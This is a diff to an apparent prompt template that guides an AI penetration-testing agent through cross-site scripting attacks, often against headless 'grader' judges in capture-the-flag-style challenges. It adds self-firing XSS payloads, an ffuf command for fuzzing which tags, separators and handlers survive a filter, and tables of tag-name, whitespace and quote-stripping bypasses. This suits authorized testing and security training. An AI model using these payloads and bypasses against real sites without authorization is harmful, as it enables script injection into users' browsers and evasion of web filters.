@@ -19,6 +19,40 @@ XSS_TOOLS = """
 
 ---
 
+## STOP — read these 3 checks BEFORE you build or theorize about any payload
+
+These are the failures that most often waste a whole session. Re-read them every time
+you form a hypothesis about the target.
+
+1. **LOCATE, don't theorize.** State WHERE your marker literally lands in the RAW response
+   (HTML body / quoted attribute `value="…"` / unquoted attribute / inside `<script>` /
+   URL / CSS). That physical position decides the payload — nothing else does.
+   **NEVER conclude "the server evaluates my input as JavaScript / server-side eval /
+   an interpreter / a `window.name` setter" from an ERROR MESSAGE.** A grader error
+   (a TypeError, "you did X instead of Y", any status text) is YOUR injected JS running
+   inside the grader's headless browser, or an incidental part of your payload throwing —
+   it is NOT evidence of a server-side code sink. Read position, not error text. If you
+   catch yourself inventing a server-side interpreter from an error string, STOP and go
+   re-read the raw reflection.
+
+2. **A headless grader does not click, hover, or type — your handler must SELF-FIRE on load.**
+   Pick an event that triggers with no user interaction: `autofocus`+`onfocus`,
+   `<img onerror=…>` with a genuinely broken `src`, `<svg onload=…>`, `<details open ontoggle=…>`.
+   If your input lands in a quoted attribute and tag vectors (`<script>`, `<img>`) are
+   stripped, break OUT of the quote (`"`) and add `autofocus onfocus=…` on the existing
+   element rather than trying to inject a new tag.
+
+3. **If the exact string the grader checks for is itself filtered, construct it WITHOUT the
+   filtered literal.** e.g. if quoted `"XSS"` is stripped, produce the string via a backtick
+   template `` `XSS` ``, `String.fromCharCode(...)`, or `/XSS/.source`. Solve the three
+   requirements — (a) break out into the right context, (b) a self-firing event, (c) build the
+   required value under the filter — SEPARATELY, then combine into one payload.
+
+Decompose. One failed combined payload does not mean the class is wrong; it usually means one
+of the three sub-parts (a/b/c) is off. Vary that sub-part, not your whole theory.
+
+---
+
 ## PRE-CONFIGURED SETTINGS (from project settings)
 
 ```
@@ -35,6 +69,8 @@ CSP bypass guidance:           {xss_csp_bypass_enabled}
 - NEVER use raw `alert()` text alone as proof. The agent MUST capture it via Playwright `page.on("dialog", ...)` so the trace contains evidence.
 - NEVER spray payloads on every parameter blindly. Run the canary sweep (Step 3) and the per-char filter probe (Step 3b) FIRST -- blind spraying is noisy and gets WAFed.
 - ALWAYS check for `Content-Security-Policy` response header before crafting payloads. CSP changes everything.
+- TRUST THE GRADER, NOT YOUR OWN BROWSER. When a target renders/scores your payload server-side (a headless bot, a "submit solution" judge), the ONLY oracle is that target's response. If a payload fires in your local Playwright/Chromium but the target still says you failed, believe the target -- graders often run a DIFFERENT or OLDER engine (PhantomJS, legacy WebKit, HtmlUnit) that parses tags, fires events, and throws errors differently. A local render that "confirms" your payload is not proof; only the grader's positive signal is.
+- READ THE FILTER FROM WHAT SURVIVES, NOT FROM ERROR TEXT. A grader message like "you triggered X" or a captured runtime error describes an OUTCOME, not the injection context. A runtime error captured as your "result" often comes from an incidental part of the payload (an attribute value, a resource URL, a quote/encoding choice), NOT from the sink -- vary those incidental parts, do not assume the sink is hooked.
 
 ---
 
@@ -114,6 +150,24 @@ Output lists which of `< > " ' ( ) ;` make it through unfiltered for that parame
 
 **Cross-reference Step 3b output with Step 3 context** before picking a payload. Don't try `<script>` if `<` is encoded.
 
+### Step 3c: Measurement-based structural enumeration (when tags/attrs are filtered)
+
+If common tags come back stripped, DO NOT conclude from memory that "no tags are allowed" -- a stripped payload is data about the filter, not proof the class is dead. Filters routinely blocklist the *canonical* tag NAMES (script/img/svg/iframe/body) while a browser still parses obscure equivalents. Enumerate the surviving forms by MEASUREMENT against the target, not by recall and not by a local render:
+
+Sweep a broad battery and diff which forms survive in the response. The engine already exists -- do not hand-loop it. Use `execute_ffuf` (clusterbomb = cross-product of wordlists) and match on the target's own win/reflection signal:
+
+```
+execute_ffuf({{"args": "-u http://TARGET/path -X POST -H 'Content-Type: application/x-www-form-urlencoded' -w tags.txt:TAG -w seps.txt:SEP -w attrs.txt:ATTR -d 'PARAM=<TAG SEP ATTR HANDLER=alert(1)>' -mode clusterbomb -mr '<WIN_OR_REFLECTION_REGEX>' -mc all"}})
+```
+
+Axes to enumerate (build the wordlists broad, from a standard reference, not from a guess):
+- **tag names** -- the long tail, not just the top 5: legacy/aliased tags, SVG/MathML namespaced elements, mixed-case, and malformed/unclosed variants. A filter that strips every standard tag frequently lets exactly ONE obscure form through -- that survivor is your injection point.
+- **attribute separators** -- when whitespace is stripped or blocked, tags collapse; try non-space separators (`/`, tab, newline, form-feed) between attributes.
+- **attribute values** -- an event handler needs its trigger to fire; vary the value form (empty attribute vs `=x` vs `=1` vs a real URL) since some engines error on one form and not another.
+- **handlers** -- match the handler to what the grader actually triggers (see Step 6).
+
+Whatever the sweep proves survives-and-fires against the target is your primitive. Trust that result over any local Playwright render.
+
 ### Step 4: Context-aware payload selection
 
 Pick from `XSS Payload Reference` (separate section below) using BOTH the context (Step 3) AND the surviving chars (Step 3b):
@@ -172,6 +226,14 @@ execute_playwright({{"script": script}})
 
 If dialog fires -> XSS confirmed, capture the URL and payload as the proof artifact, move to Step 8 (impact).
 If dialog does NOT fire but the payload appears in HTML source -> filter is encoding output (HTML entity encoding likely). Either pick a different context payload from `XSS_PAYLOAD_REFERENCE` or move to Step 7 (WAF bypass).
+
+**When a server-side grader scores the payload (headless bot / "submit solution" judge):** your local Playwright dialog is a REHEARSAL, not the verdict -- the target's response is the verdict. A payload that pops in your Chromium can still fail the grader (different/older engine), and vice-versa; when they disagree, trust the grader and vary the payload against the grader (Step 3c), not against your local browser.
+
+**Match the handler to the trigger the grader actually fires.** Headless judges fire a limited set of events -- pick a handler that will actually run in that environment:
+- `onerror` -- fires only when a resource genuinely fails to load; ensure the `src`/`href` truly errors (an empty or invalid value), and note some engines throw on certain value forms (vary it per Step 3c).
+- `onload` -- fires on successful element/resource load.
+- `onfocus` + `autofocus` -- many grader bots explicitly dispatch focus to `[autofocus]`/`[onfocus]` elements; a reliable trigger when image/script vectors are filtered.
+- `ontoggle` (`<details open>`), `onanimationstart`/`ontransitionend` (CSS-driven) -- fire without user interaction and survive some filters.
 
 ### Step 7: WAF / filter bypass via dalfox (when manual payloads fail)
 
@@ -436,6 +498,20 @@ Ultra-short (when length-limited):
 | `javascript:` schema variants | `JaVaScRiPt:`, `java\\tscript:`, `java\\nscript:` | URL filter blocks lowercase |
 | String concat (no quotes) | `top[/al/.source+/ert/.source](1)` | Quote-stripping filter |
 | Backtick template (no quotes) | `` setTimeout`alert\\x281\\x29` `` | Quote-stripping filter |
+
+### Tag-name obfuscation (bypassing tag allowlists / blacklists)
+
+When a filter strips tags by NAME, the browser parser is more permissive than the filter's regex -- one of these families usually slips through. Do NOT pick from memory; SWEEP them against the target (Step 3c) and read what survives-and-fires:
+
+| Family | Examples | Why it slips past |
+|--------|----------|-------------------|
+| Legacy / alias tags | `<image>` (parses as img), `<listing>`, `<xmp>`, `<plaintext>` | Filter blocklists the modern name; parser maps the alias to the real element |
+| Namespaced (SVG / MathML) | `<svg><animate onbegin=alert(1)>`, `<math><mtext>`, `<svg><set onbegin=alert(1)>` | Namespaced parsing differs from flat HTML allowlists |
+| Case / spacing | `<ImG>`, `<SvG>`, tag with a leading control char | Case-sensitive or exact-name filters miss the variant |
+| Malformed / unclosed | `<svg onload=alert(1)<`, `<img src=x onerror=alert(1)//` | Lenient parser still builds the element; a strict regex does not match |
+| Slash-separated (no whitespace) | `<svg/onload=alert(1)>`, `<img/src=x/onerror=alert(1)>` | `/` separates attributes, so a whitespace-stripping filter can't break the tag |
+
+The last row doubles as the whitespace-filter bypass: if spaces are removed from your input, join attributes with `/` instead.
 
 ### CSP bypass shortcuts
 
